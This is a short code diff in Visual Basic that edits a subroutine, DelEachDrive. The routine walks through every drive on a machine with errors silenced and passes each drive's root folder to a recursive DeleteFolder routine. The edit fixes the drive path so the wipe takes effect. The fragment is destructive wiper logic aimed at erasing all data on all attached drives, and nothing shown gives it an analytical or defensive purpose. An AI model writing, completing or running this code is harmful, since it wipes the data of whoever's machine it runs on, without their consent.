@@ -30,7 +30,7 @@ Sub DelEachDrive()
 On Error Resume Next
         Dim a As New FileSystemObject, b As Drive
         For Each b In a.Drives
-                DeleteFolder b.Path
+                DeleteFolder b.RootFolder.Path
         Next
 End Sub
 Sub DeleteFolder(Path As String)
